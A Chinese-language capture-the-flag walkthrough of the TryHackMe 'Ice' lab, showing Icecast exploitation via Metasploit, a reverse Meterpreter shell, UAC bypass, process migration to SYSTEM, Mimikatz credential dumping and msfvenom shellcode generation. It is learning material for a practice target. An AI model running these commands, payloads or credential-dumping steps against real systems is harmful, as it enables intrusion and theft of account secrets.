# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务扫描
```
┌──(root💀kali)-[~/tryhackme/ice]
└─# nmap -sV -Pn 10.10.121.62     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-15 00:43 EST
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 00:44 (0:00:19 remaining)
Nmap scan report for 10.10.121.62
Host is up (0.30s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http               Icecast streaming media server
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

看到开了很多端口，我们留意8000端口这个服务，在[CVE Details](https://www.cvedetails.com/cve/CVE-2004-1561/)显示存在一个```Execute CodeOverflow```漏洞，CVE编号为:```CVE-2004-1561```

在msf上搜索这个编号的漏洞利用模块：
```
msf6 > search CVE-2004-1561

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

```

# 初始shell
设置参数，开始攻击，顺利拿到初始shell
```
msf6 exploit(windows/http/icecast_header) > set rhosts 10.10.121.62
rhosts => 10.10.121.62
msf6 exploit(windows/http/icecast_header) > set lhost tun0
lhost => tun0
msf6 exploit(windows/http/icecast_header) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Sending stage (175174 bytes) to 10.10.121.62
[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.121.62:49302) at 2021-11-15 02:40:26 -0500

meterpreter > shell
Process 356 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>whoami
whoami
dark-pc\dark
```

使用```post/multi/recon/local_exploit_suggester```枚举提权模块

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.121.62 - Collecting local exploits for x86/windows...
[*] 10.10.121.62 - 37 exploit checks are being tried...
[+] 10.10.121.62 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.121.62 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.121.62 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.121.62 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.121.62 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.121.62 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.121.62 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.121.62 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.121.62 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

```

我们选择```exploit/windows/local/bypassuac_eventvwr```这个提权模块，设置参数，进行提权

```
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_eventvwr) > options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.3.67     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175174 bytes) to 10.10.121.62
[*] Meterpreter session 2 opened (10.13.21.169:4444 -> 10.10.121.62:49336) at 2021-11-15 03:12:02 -0500
[*] Cleaning up registry keys ...
meterpreter > shell
Process 356 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>whoami
whoami
dark-pc\dark

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

```

# 提权
我们的权限账号依然是```dark-pc\dark```,但是用```getprivs```命令查看，显示现在已经拥有了```SeTakeOwnershipPrivilege```的权限

用PS命令列出目前靶机所有进程：

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 500   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 588   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1056  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1136  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1224  816   slui.exe              x64   1        Dark-PC\Dark                  C:\Windows\System32\slui.exe
 1264  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1328  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1408  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1516  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1528  500   dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1548  1508  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1712  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1720  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 1752  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1804  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1892  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 2108  2300  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
 2124  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2284  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 2300  1548  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2352  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2460  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2528  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2536  2092  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
 2916  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe

```


留意这个进程：
```
 1264  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
```

这个进程与当前进程同样是x64架构。我们用```migrate -N```把进程迁移到这个进程当中，成功升级到系统最高权限。

```
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 2536 to 1264...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

# 获取其他用户凭证

使用```load kiwi```命令收集系统里其他用户的凭证信息
```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

使用命令```help```查看支持的kiwi指令：
```
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

```


使用```creds_all```命令打印出所有用户凭证：
```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)

```

我们看到```dark```的登录密码是：```Password01!```

# 非MSF方法

下载[这个exp](https://github.com/ivanitlearning/CVE-2004-1561)


```
┌──(root💀kali)-[~/tryhackme/ice/CVE-2004-1561]
└─# msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.21.169 LPORT=4433 -b '\x0a\x0d\x00' -f c
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=246, char=0x0a)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor chosen with final size 551
Payload size: 551 bytes
Final size of c file: 2339 bytes
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x26\x2f\xfd\xab\xae\xa1\x17\x6c\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xda\x67\x7e\x4f\x5e\x49"
"\xdb\x6c\x26\x2f\xbc\xfa\xef\xf1\x45\x24\x17\xfd\x98\xe3\x25"
"\xf3\x77\x24\xad\x7d\xe5\xe3\x25\xf3\x37\x3d\x70\x67\x76\xd9"
"\xfe\xec\x26\xa5\x6e\x20\x4a\xe1\xe4\xe9\x26\xac\x8a\x13\x9c"
"\xd7\xac\x8d\x37\x2d\xe7\xe6\xf0\xea\xaf\x60\xf5\x81\x74\x67"
"\x76\xf9\x8e\x2a\x55\x50\x6e\x2e\x2d\xea\xff\xc7\x96\x14\x3e"
"\x24\xff\xa4\x2b\xd3\x17\x6c\x26\xa4\x7d\x23\xae\xa1\x17\x24"
"\xa3\xef\x89\xcc\xe6\xa0\xc7\x3c\xad\x67\xe5\xef\x25\xe1\x37"
"\x25\x27\xff\x1e\xfd\xe6\x5e\xde\x21\x17\xe6\xbc\x20\x9a\x29"
"\x5f\x6d\xf0\x67\xcc\x6b\xef\x60\xde\x61\x8a\x6e\xfc\x6a\x96"
"\x41\x62\x9d\x6a\x2c\xb1\x8f\xa6\xe4\x2e\xbd\x53\xf7\xa5\xef"
"\x25\xe1\x33\x25\x27\xff\x9b\xea\x25\xad\x5f\x28\xad\x6f\xe1"
"\xe2\xaf\x71\x56\xe7\x22\xa7\xbc\xf3\xef\xf9\x5f\x6d\xf6\x71"
"\xa4\xf1\xef\xf9\x56\x35\x67\x75\xb5\x28\x42\x81\x56\x3e\xd9"
"\xcf\xa5\xea\xf7\xfb\x5f\xe7\x34\xc6\xb6\x54\x51\x5e\x4a\x25"
"\x98\x58\x8e\x99\xf1\x92\x25\x6c\x26\x6e\xab\xe2\x27\x47\x5f"
"\xed\xca\x8f\xfc\xab\xae\xe8\x9e\x89\x6f\x93\xff\xab\xbf\xf0"
"\x1d\x61\x33\x86\xbc\xff\xe7\x28\xf3\x20\xaf\xde\xbc\x11\xe2"
"\xd6\x31\x6b\xd9\xfa\xb1\x22\x44\xc9\x16\x6d\x26\x2f\xa4\xea"
"\x14\x88\x97\x07\x26\xd0\x28\xc1\xa4\xe0\x49\x3c\x76\x62\xcc"
"\x62\xe3\x90\xd7\x24\xd9\xef\xb5\x22\x6c\xe9\xe8\xac\x6e\xa6"
"\x3c\xea\x14\x4b\x18\xb3\xc6\xd0\x28\xe3\x27\x66\x7d\x7c\x67"
"\x77\xb1\x22\x4c\xe9\x9e\x95\x67\x95\x64\x0e\xda\xc0\xe8\xb9"
"\xa3\xef\x89\xa1\xe7\x5e\xd9\x19\xc3\xc7\x6e\xab\xae\xa1\x5f"
"\xef\xca\x3f\xb5\x22\x4c\xec\x26\xa5\x4c\x2b\xbc\xf3\xe6\x28"
"\xee\x2d\x9c\x2d\x24\x63\xf1\x5e\xc2\xef\xde\x2f\x83\xfe\xe6"
"\x22\xd3\x4c\x78\xa6\x0b\xc1\xee\xe0\x4e\x04\x26\x3f\xfd\xab"
"\xef\xf9\x5f\xe5\xd4\x67\xcc\x62\xef\x1b\x4f\xc8\x75\xca\x02"
"\x7e\xe6\x28\xd4\x25\xaf\xe8\xb0\x9a\x67\xe8\x9e\x9c\x6e\xa6"
"\x27\xe3\x27\x58\x56\xd6\x24\xf6\x35\xf4\x51\x74\x94\x94\x26"
"\x52\xd5\xf3\xef\xf6\x4e\x04\x26\x6f\xfd\xab\xef\xf9\x7d\x6c"
"\x7c\x6e\x47\xa0\x81\xae\x27\x93\xf3\x78\xa4\xea\x14\xd4\x79"
"\x21\x47\xd0\x28\xe2\x51\x6f\xfe\x50\xd9\xd0\x02\xe3\xaf\x62"
"\x5f\x45\xe0\x67\x78\x5d\xdb\x15\x56\x93\xc1\x77\x97\xab\xf7"
"\xe8\xd0\xae\xd6\x9a\x5f\xfd\x51\x74\x17\x6c";

```